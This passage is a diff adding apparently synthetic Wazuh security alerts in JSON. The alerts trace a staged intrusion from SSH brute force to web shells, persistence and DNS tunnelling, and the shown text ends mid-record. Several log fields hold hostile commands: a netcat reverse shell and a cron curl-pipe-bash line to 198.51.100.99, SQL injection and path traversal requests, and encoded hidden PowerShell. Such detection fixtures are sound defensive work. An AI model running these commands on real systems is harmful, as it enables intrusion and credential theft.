@@ -1,0 +1,2521 @@
+[
+  {
+    "id": "1790761522.100001",
+    "timestamp": "2026-09-30T10:35:22.123+0000",
+    "rule": {
+      "id": "5710",
+      "level": 5,
+      "description": "sshd: Attempt to login using a non-existent user",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ],
+      "firedtimes": 3,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ],
+        "tactic": [
+          "Initial Access"
+        ],
+        "technique": [
+          "Password Guessing"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "server-prod-01",
+      "ip": "192.168.1.20"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "sshd"
+    },
+    "full_log": "Sep 30 10:35:21 server-prod-01 sshd[18422]: Failed password for invalid user admin from 198.51.100.50 port 54321 ssh2",
+    "data": {
+      "srcip": "198.51.100.50",
+      "srcport": "54321",
+      "dstport": "22",
+      "protocol": "tcp",
+      "srcuser": "admin"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "id": "1790761522.100002",
+    "timestamp": "2026-09-30T10:36:05.412+0000",
+    "rule": {
+      "id": "5712",
+      "level": 10,
+      "description": "sshd: SSH brute force attack detected (multiple failed logins)",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failures"
+      ],
+      "firedtimes": 18,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Password Guessing"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "server-prod-01",
+      "ip": "192.168.1.20"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "sshd"
+    },
+    "full_log": "Sep 30 10:36:04 server-prod-01 sshd[18450]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.50 user=root",
+    "data": {
+      "srcip": "198.51.100.50",
+      "dstport": "22",
+      "srcuser": "root"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "id": "1790761522.100003",
+    "timestamp": "2026-09-30T10:38:12.789+0000",
+    "rule": {
+      "id": "5715",
+      "level": 6,
+      "description": "sshd: Successful login to the system using SSH key",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_success"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1078"
+        ],
+        "tactic": [
+          "Initial Access"
+        ],
+        "technique": [
+          "Valid Accounts"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "server-prod-01",
+      "ip": "192.168.1.20"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "sshd"
+    },
+    "full_log": "Sep 30 10:38:12 server-prod-01 sshd[18501]: Accepted publickey for deploy_user from 203.0.113.15 port 49120 ssh2: RSA SHA256:4a8b1c",
+    "data": {
+      "srcip": "203.0.113.15",
+      "srcport": "49120",
+      "dstport": "22",
+      "protocol": "tcp",
+      "srcuser": "deploy_user"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "id": "1790761522.100004",
+    "timestamp": "2026-09-30T10:42:15.334+0000",
+    "rule": {
+      "id": "5402",
+      "level": 5,
+      "description": "sudo: User not in sudoers; attempt to run command as root",
+      "groups": [
+        "syslog",
+        "sudo"
+      ],
+      "firedtimes": 2,
+      "mitre": {
+        "id": [
+          "T1078.003"
+        ],
+        "tactic": [
+          "Privilege Escalation"
+        ],
+        "technique": [
+          "Local Accounts"
+        ]
+      }
+    },
+    "agent": {
+      "id": "002",
+      "name": "dev-box-03",
+      "ip": "192.168.1.35"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "sudo"
+    },
+    "full_log": "Sep 30 10:42:15 dev-box-03 sudo[2210]: intern_user : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/intern_user ; USER=root ; COMMAND=/bin/cat /etc/shadow",
+    "data": {
+      "srcuser": "intern_user",
+      "dstuser": "root",
+      "command": "/bin/cat /etc/shadow",
+      "tty": "pts/1"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "id": "1790761522.100005",
+    "timestamp": "2026-09-30T10:45:00.012+0000",
+    "rule": {
+      "id": "550",
+      "level": 9,
+      "description": "Integrity checksum changed for sensitive file: /etc/sudoers",
+      "groups": [
+        "syscheck",
+        "syscheck_entry_modified"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1548.003"
+        ],
+        "tactic": [
+          "Privilege Escalation",
+          "Persistence"
+        ],
+        "technique": [
+          "Sudo and Sudo Caching"
+        ]
+      }
+    },
+    "agent": {
+      "id": "002",
+      "name": "dev-box-03",
+      "ip": "192.168.1.35"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "syscheck_integrity_changed"
+    },
+    "full_log": "Integrity checksum changed for: '/etc/sudoers' Size changed from '1780' to '1842' Old md5: '3c8f8b89d42' New md5: 'e1a90c4b228'",
+    "data": {
+      "file": "/etc/sudoers",
+      "size_before": "1780",
+      "size_after": "1842",
+      "md5_before": "3c8f8b89d42",
+      "md5_after": "e1a90c4b228"
+    },
+    "location": "syscheck"
+  },
+  {
+    "id": "1790761522.100006",
+    "timestamp": "2026-09-30T10:50:33.881+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Windows: Logon failure - Unknown user name or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 4,
+      "mitre": {
+        "id": [
+          "T1110"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Brute Force"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Security-Auditing: Event 4625, An account failed to log on. Subject: Security ID: S-1-0-0, Account Name: -, Logon Type: 3, Account For Which Logon Failed: Security ID: S-1-0-0, Account Name: svc_backup, Failure Reason: Unknown user name or bad password (0xC000006A), Workstation Name: WORKSTATION-92, Source Network Address: 10.0.20.88, Source Port: 59321",
+    "data": {
+      "win": {
+        "eventdata": {
+          "targetUserName": "svc_backup",
+          "ipAddress": "10.0.20.88",
+          "ipPort": "59321",
+          "logonType": "3",
+          "status": "0xC000006A"
+        },
+        "system": {
+          "eventID": "4625",
+          "channel": "Security"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100007",
+    "timestamp": "2026-09-30T10:52:10.005+0000",
+    "rule": {
+      "id": "60123",
+      "level": 10,
+      "description": "Windows: Multiple logon failures occurred in a short period",
+      "groups": [
+        "windows",
+        "windows_security",
+        "attack"
+      ],
+      "firedtimes": 25,
+      "mitre": {
+        "id": [
+          "T1110.003"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Password Spraying"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Security-Auditing: Multiple failed logon attempts detected against domain controller win-dc-01 from workstation 10.0.20.88 across multiple accounts (finance_mgr, hr_exec, jsmith, mross).",
+    "data": {
+      "win": {
+        "eventdata": {
+          "ipAddress": "10.0.20.88",
+          "logonType": "3",
+          "failureCount": "25"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100008",
+    "timestamp": "2026-09-30T11:02:18.420+0000",
+    "rule": {
+      "id": "60109",
+      "level": 8,
+      "description": "Windows: A user account was created",
+      "groups": [
+        "windows",
+        "windows_security",
+        "account_created"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1136.001"
+        ],
+        "tactic": [
+          "Persistence"
+        ],
+        "technique": [
+          "Local Account"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Security-Auditing: Event 4720, A user account was created. Subject: Security ID: S-1-5-21-12345-500, Account Name: Administrator, Target Account: Security ID: S-1-5-21-12345-1105, Account Name: it_support_temp, SAM Account Name: it_support_temp",
+    "data": {
+      "win": {
+        "eventdata": {
+          "subjectUserName": "Administrator",
+          "targetUserName": "it_support_temp"
+        },
+        "system": {
+          "eventID": "4720",
+          "channel": "Security"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100009",
+    "timestamp": "2026-09-30T11:03:04.112+0000",
+    "rule": {
+      "id": "60115",
+      "level": 11,
+      "description": "Windows: A member was added to a security-enabled global group (Domain Admins)",
+      "groups": [
+        "windows",
+        "windows_security",
+        "group_modified"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1098"
+        ],
+        "tactic": [
+          "Persistence",
+          "Privilege Escalation"
+        ],
+        "technique": [
+          "Account Manipulation"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Security-Auditing: Event 4728, A member was added to a security-enabled global group. Subject: Account Name: Administrator, Member: Account Name: CN=it_support_temp,CN=Users,DC=corp,DC=internal, Target Group: Account Name: Domain Admins",
+    "data": {
+      "win": {
+        "eventdata": {
+          "subjectUserName": "Administrator",
+          "memberUserName": "it_support_temp",
+          "targetGroupName": "Domain Admins"
+        },
+        "system": {
+          "eventID": "4728",
+          "channel": "Security"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100010",
+    "timestamp": "2026-09-30T11:15:30.950+0000",
+    "rule": {
+      "id": "554",
+      "level": 12,
+      "description": "Integrity checksum changed for critical system binary: /bin/login",
+      "groups": [
+        "syscheck",
+        "syscheck_entry_modified",
+        "syscheck_file"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1556"
+        ],
+        "tactic": [
+          "Credential Access",
+          "Persistence"
+        ],
+        "technique": [
+          "Modify Authentication Process"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "server-prod-01",
+      "ip": "192.168.1.20"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "syscheck_integrity_changed"
+    },
+    "full_log": "Integrity checksum changed for: '/bin/login' Size changed from '61224' to '65408' SHA256 changed from '8a1f...' to '2c9e...'",
+    "data": {
+      "file": "/bin/login",
+      "size_before": "61224",
+      "size_after": "65408",
+      "sha256_before": "8a1f49e0b12",
+      "sha256_after": "2c9e1189ac3"
+    },
+    "location": "syscheck"
+  },
+  {
+    "id": "1790761522.100011",
+    "timestamp": "2026-09-30T11:20:10.120+0000",
+    "rule": {
+      "id": "550",
+      "level": 9,
+      "description": "Integrity checksum changed for file: /etc/shadow",
+      "groups": [
+        "syscheck",
+        "syscheck_entry_modified"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1003.008"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "/etc/passwd and /etc/shadow"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "server-prod-01",
+      "ip": "192.168.1.20"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "syscheck_integrity_changed"
+    },
+    "full_log": "Integrity checksum changed for: '/etc/shadow' Perms changed from '640' to '644' md5 changed",
+    "data": {
+      "file": "/etc/shadow",
+      "perm_before": "640",
+      "perm_after": "644"
+    },
+    "location": "syscheck"
+  },
+  {
+    "id": "1790761522.100012",
+    "timestamp": "2026-09-30T11:32:00.671+0000",
+    "rule": {
+      "id": "87103",
+      "level": 12,
+      "description": "Rootcheck: Suspicious file detected in shared memory filesystem /dev/shm/.kworker",
+      "groups": [
+        "rootcheck",
+        "malware"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1027.001"
+        ],
+        "tactic": [
+          "Defense Evasion"
+        ],
+        "technique": [
+          "Binary Padding"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "web-cluster-01",
+      "ip": "192.168.2.10"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "rootcheck"
+    },
+    "full_log": "Rootcheck: File '/dev/shm/.kworker' is executable and hidden from standard directory listings. Possible ELF crypto-miner or backdoor payload.",
+    "data": {
+      "title": "File '/dev/shm/.kworker' is executable and hidden",
+      "file": "/dev/shm/.kworker"
+    },
+    "location": "rootcheck"
+  },
+  {
+    "id": "1790761522.100013",
+    "timestamp": "2026-09-30T11:40:19.332+0000",
+    "rule": {
+      "id": "100100",
+      "level": 12,
+      "description": "auditd: Suspicious interactive shell spawn via netcat command line",
+      "groups": [
+        "audit",
+        "execution",
+        "reverse_shell"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1059.004"
+        ],
+        "tactic": [
+          "Execution"
+        ],
+        "technique": [
+          "Unix Shell"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "web-cluster-01",
+      "ip": "192.168.2.10"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "auditd"
+    },
+    "full_log": "type=EXECVE msg=audit(1696074019.332:9821): argc=4 a0=\"nc\" a1=\"-e\" a2=\"/bin/sh\" a3=\"198.51.100.99 4444\"",
+    "data": {
+      "audit": {
+        "type": "execve",
+        "command": "nc -e /bin/sh 198.51.100.99 4444",
+        "cwd": "/var/www/html",
+        "euid": "33",
+        "exe": "/bin/nc.traditional"
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "id": "1790761522.100014",
+    "timestamp": "2026-09-30T11:45:55.109+0000",
+    "rule": {
+      "id": "91802",
+      "level": 11,
+      "description": "Sysmon: Suspicious PowerShell process executed with base64 encoded command arguments",
+      "groups": [
+        "windows",
+        "sysmon",
+        "process_creation"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1059.001"
+        ],
+        "tactic": [
+          "Execution"
+        ],
+        "technique": [
+          "PowerShell"
+        ]
+      }
+    },
+    "agent": {
+      "id": "005",
+      "name": "workstation-hr-12",
+      "ip": "10.0.30.25"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Sysmon: Event 1 (Process Create). UtcTime: 2026-09-30 11:45:54.890, Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, CommandLine: powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA..., ParentImage: C:\\Windows\\explorer.exe, User: CORP\\m_smith",
+    "data": {
+      "win": {
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgA...",
+          "user": "CORP\\m_smith",
+          "parentImage": "C:\\Windows\\explorer.exe"
+        },
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100015",
+    "timestamp": "2026-09-30T11:51:22.401+0000",
+    "rule": {
+      "id": "91803",
+      "level": 8,
+      "description": "Sysmon: Network connection initiated to rare external destination port 8443",
+      "groups": [
+        "windows",
+        "sysmon",
+        "network_connection"
+      ],
+      "firedtimes": 6,
+      "mitre": {
+        "id": [
+          "T1071.001"
+        ],
+        "tactic": [
+          "Command and Control"
+        ],
+        "technique": [
+          "Web Protocols"
+        ]
+      }
+    },
+    "agent": {
+      "id": "005",
+      "name": "workstation-hr-12",
+      "ip": "10.0.30.25"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Sysmon: Event 3 (Network connect). Image: C:\\Windows\\Temp\\update_service.exe, SourceIp: 10.0.30.25, SourcePort: 49780, DestinationIp: 203.0.113.88, DestinationPort: 8443, Protocol: tcp",
+    "data": {
+      "win": {
+        "eventdata": {
+          "image": "C:\\Windows\\Temp\\update_service.exe",
+          "destinationIp": "203.0.113.88",
+          "destinationPort": "8443",
+          "protocol": "tcp"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100016",
+    "timestamp": "2026-09-30T12:00:15.908+0000",
+    "rule": {
+      "id": "4100",
+      "level": 4,
+      "description": "Firewall: Packet dropped by iptables default drop policy",
+      "groups": [
+        "firewall",
+        "iptables"
+      ],
+      "firedtimes": 45,
+      "mitre": {
+        "id": [
+          "T1046"
+        ],
+        "tactic": [
+          "Discovery"
+        ],
+        "technique": [
+          "Network Service Discovery"
+        ]
+      }
+    },
+    "agent": {
+      "id": "006",
+      "name": "edge-gateway-fw",
+      "ip": "192.168.1.1"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "iptables"
+    },
+    "full_log": "Sep 30 12:00:15 edge-gateway-fw kernel: [IPTABLES DROP] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=198.51.100.120 DST=192.168.1.1 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=54321 PROTO=TCP SPT=41234 DPT=3389 WINDOW=1024 RES=0x00 SYN URGP=0",
+    "data": {
+      "srcip": "198.51.100.120",
+      "dstip": "192.168.1.1",
+      "srcport": "41234",
+      "dstport": "3389",
+      "protocol": "TCP"
+    },
+    "location": "/var/log/kern.log"
+  },
+  {
+    "id": "1790761522.100017",
+    "timestamp": "2026-09-30T12:05:40.114+0000",
+    "rule": {
+      "id": "40111",
+      "level": 10,
+      "description": "Multiple firewall drop events from single source IP (Port scan detected)",
+      "groups": [
+        "firewall",
+        "scan"
+      ],
+      "firedtimes": 100,
+      "mitre": {
+        "id": [
+          "T1046"
+        ],
+        "tactic": [
+          "Discovery"
+        ],
+        "technique": [
+          "Network Service Discovery"
+        ]
+      }
+    },
+    "agent": {
+      "id": "006",
+      "name": "edge-gateway-fw",
+      "ip": "192.168.1.1"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "iptables"
+    },
+    "full_log": "Sep 30 12:05:40 edge-gateway-fw kernel: More than 100 ports scanned from 198.51.100.120 within 15 seconds.",
+    "data": {
+      "srcip": "198.51.100.120",
+      "dstip": "192.168.1.1"
+    },
+    "location": "/var/log/kern.log"
+  },
+  {
+    "id": "1790761522.100018",
+    "timestamp": "2026-09-30T12:12:05.654+0000",
+    "rule": {
+      "id": "80710",
+      "level": 9,
+      "description": "DNS: Unusually high frequency of TXT queries and high-entropy domain lookups",
+      "groups": [
+        "dns",
+        "bind",
+        "tunneling"
+      ],
+      "firedtimes": 60,
+      "mitre": {
+        "id": [
+          "T1071.004"
+        ],
+        "tactic": [
+          "Command and Control"
+        ],
+        "technique": [
+          "DNS"
+        ]
+      }
+    },
+    "agent": {
+      "id": "007",
+      "name": "dns-internal-01",
+      "ip": "192.168.1.53"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "named"
+    },
+    "full_log": "Sep 30 12:12:04 dns-internal-01 named[998]: client @0x7f88 10.0.30.25#51402 (a7f83b92c4e1.tunnel.badactor-domain.test): query: a7f83b92c4e1.tunnel.badactor-domain.test IN TXT + (192.168.1.53)",
+    "data": {
+      "srcip": "10.0.30.25",
+      "domain": "a7f83b92c4e1.tunnel.badactor-domain.test",
+      "query_type": "TXT"
+    },
+    "location": "/var/log/named/query.log"
+  },
+  {
+    "id": "1790761522.100019",
+    "timestamp": "2026-09-30T12:20:18.990+0000",
+    "rule": {
+      "id": "31106",
+      "level": 6,
+      "description": "Apache: Directory traversal attempt detected in HTTP request URL",
+      "groups": [
+        "web",
+        "appsec",
+        "attack"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1190"
+        ],
+        "tactic": [
+          "Initial Access"
+        ],
+        "technique": [
+          "Exploit Public-Facing Application"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "web-cluster-01",
+      "ip": "192.168.2.10"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "apache-accesslog"
+    },
+    "full_log": "198.51.100.75 - - [30/Sep/2026:12:20:18 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 400 226 \"-\" \"curl/7.68.0\"",
+    "data": {
+      "srcip": "198.51.100.75",
+      "url": "/../../../../etc/passwd",
+      "action": "GET",
+      "id": "400"
+    },
+    "location": "/var/log/apache2/access.log"
+  },
+  {
+    "id": "1790761522.100020",
+    "timestamp": "2026-09-30T12:25:44.210+0000",
+    "rule": {
+      "id": "31101",
+      "level": 8,
+      "description": "Apache: SQL injection keyword detected in HTTP GET parameters",
+      "groups": [
+        "web",
+        "appsec",
+        "sqli"
+      ],
+      "firedtimes": 3,
+      "mitre": {
+        "id": [
+          "T1190"
+        ],
+        "tactic": [
+          "Initial Access"
+        ],
+        "technique": [
+          "Exploit Public-Facing Application"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "web-cluster-01",
+      "ip": "192.168.2.10"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "apache-accesslog"
+    },
+    "full_log": "198.51.100.75 - - [30/Sep/2026:12:25:44 +0000] \"GET /products.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1\" 500 532 \"-\" \"Mozilla/5.0\"",
+    "data": {
+      "srcip": "198.51.100.75",
+      "url": "/products.php?id=1 UNION SELECT null,username,password FROM users--",
+      "action": "GET",
+      "id": "500"
+    },
+    "location": "/var/log/apache2/access.log"
+  },
+  {
+    "id": "1790761522.100021",
+    "timestamp": "2026-09-30T12:30:11.831+0000",
+    "rule": {
+      "id": "550",
+      "level": 11,
+      "description": "File integrity monitoring: New PHP script created in upload directory (/var/www/uploads/shell.php)",
+      "groups": [
+        "syscheck",
+        "syscheck_entry_added"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1505.003"
+        ],
+        "tactic": [
+          "Persistence"
+        ],
+        "technique": [
+          "Web Shell"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "web-cluster-01",
+      "ip": "192.168.2.10"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "syscheck_new_entry"
+    },
+    "full_log": "New file '/var/www/uploads/shell.php' with md5: 'd41d8cd98f00b204e9800998ecf8427e' added to monitored directory.",
+    "data": {
+      "file": "/var/www/uploads/shell.php",
+      "md5": "d41d8cd98f00b204e9800998ecf8427e"
+    },
+    "location": "syscheck"
+  },
+  {
+    "id": "1790761522.100022",
+    "timestamp": "2026-09-30T12:40:02.100+0000",
+    "rule": {
+      "id": "60150",
+      "level": 9,
+      "description": "Windows: A new system service was installed (Event ID 7045)",
+      "groups": [
+        "windows",
+        "system",
+        "service_creation"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1543.003"
+        ],
+        "tactic": [
+          "Persistence",
+          "Privilege Escalation"
+        ],
+        "technique": [
+          "Windows Service"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Service Control Manager: Event 7045, A service was installed in the system. Service Name: WcsMaintenanceSvc, Service File Name: C:\\ProgramData\\wcs_service.exe -run, Service Type: user mode service, Service Start Type: auto start, Service Account: LocalSystem",
+    "data": {
+      "win": {
+        "eventdata": {
+          "serviceName": "WcsMaintenanceSvc",
+          "imagePath": "C:\\ProgramData\\wcs_service.exe -run",
+          "serviceType": "user mode service",
+          "startType": "auto start"
+        },
+        "system": {
+          "eventID": "7045",
+          "channel": "System"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100023",
+    "timestamp": "2026-09-30T12:48:33.400+0000",
+    "rule": {
+      "id": "550",
+      "level": 8,
+      "description": "File integrity monitoring: New file added in /etc/cron.d/sync_service",
+      "groups": [
+        "syscheck",
+        "syscheck_entry_added"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1053.003"
+        ],
+        "tactic": [
+          "Persistence",
+          "Execution"
+        ],
+        "technique": [
+          "Cron"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "server-prod-01",
+      "ip": "192.168.1.20"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "syscheck_new_entry"
+    },
+    "full_log": "New file '/etc/cron.d/sync_service' added. Contents: '*/10 * * * * root curl -s http://198.51.100.99/sync.sh | bash'",
+    "data": {
+      "file": "/etc/cron.d/sync_service"
+    },
+    "location": "syscheck"
+  },
+  {
+    "id": "1790761522.100024",
+    "timestamp": "2026-09-30T12:55:10.820+0000",
+    "rule": {
+      "id": "60155",
+      "level": 8,
+      "description": "Windows: A scheduled task was created (Event ID 4698)",
+      "groups": [
+        "windows",
+        "task_scheduler"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1053.005"
+        ],
+        "tactic": [
+          "Persistence",
+          "Execution"
+        ],
+        "technique": [
+          "Scheduled Task"
+        ]
+      }
+    },
+    "agent": {
+      "id": "005",
+      "name": "workstation-hr-12",
+      "ip": "10.0.30.25"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Security-Auditing: Event 4698, A scheduled task was created. Subject: Account Name: m_smith, Task Name: \\Microsoft\\Windows\\UpdateTelemetryRun, Task Content: Executable: powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...",
+    "data": {
+      "win": {
+        "eventdata": {
+          "subjectUserName": "m_smith",
+          "taskName": "\\Microsoft\\Windows\\UpdateTelemetryRun"
+        },
+        "system": {
+          "eventID": "4698",
+          "channel": "Security"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100025",
+    "timestamp": "2026-09-30T13:02:45.311+0000",
+    "rule": {
+      "id": "60180",
+      "level": 12,
+      "description": "Windows Defender: Antivirus real-time protection feature has been disabled",
+      "groups": [
+        "windows",
+        "defender",
+        "defense_evasion"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1562.001"
+        ],
+        "tactic": [
+          "Defense Evasion"
+        ],
+        "technique": [
+          "Disable or Modify Tools"
+        ]
+      }
+    },
+    "agent": {
+      "id": "005",
+      "name": "workstation-hr-12",
+      "ip": "10.0.30.25"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Windows Defender: Event 5001, Microsoft Defender Antivirus Real-time Protection feature has been disabled. User: NT AUTHORITY\\SYSTEM",
+    "data": {
+      "win": {
+        "eventdata": {
+          "feature": "Real-time Protection",
+          "state": "Disabled"
+        },
+        "system": {
+          "eventID": "5001",
+          "channel": "Microsoft-Windows-Windows Defender/Operational"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100026",
+    "timestamp": "2026-09-30T13:10:00.000+0000",
+    "rule": {
+      "id": "60190",
+      "level": 7,
+      "description": "Windows: Removable USB Mass Storage device plugged into endpoint",
+      "groups": [
+        "windows",
+        "usb_storage",
+        "peripheral"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1091"
+        ],
+        "tactic": [
+          "Initial Access",
+          "Lateral Movement"
+        ],
+        "technique": [
+          "Replication Through Removable Media"
+        ]
+      }
+    },
+    "agent": {
+      "id": "005",
+      "name": "workstation-hr-12",
+      "ip": "10.0.30.25"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-DriverFrameworks-UserMode: Event 2003, The driver for device USBSTOR\\Disk&Ven_SanDisk&Prod_Cruzer_Blade\\2004223 has been loaded.",
+    "data": {
+      "win": {
+        "eventdata": {
+          "device": "USBSTOR\\Disk&Ven_SanDisk&Prod_Cruzer_Blade\\2004223"
+        },
+        "system": {
+          "eventID": "2003",
+          "channel": "Microsoft-Windows-DriverFrameworks-UserMode/Operational"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100027",
+    "timestamp": "2026-09-30T02:00:10.512+0000",
+    "rule": {
+      "id": "1002",
+      "level": 2,
+      "description": "System: Routine automated database backup maintenance script completed successfully",
+      "groups": [
+        "syslog",
+        "maintenance",
+        "backup"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "db-cluster-master",
+      "ip": "192.168.3.5"
+    },
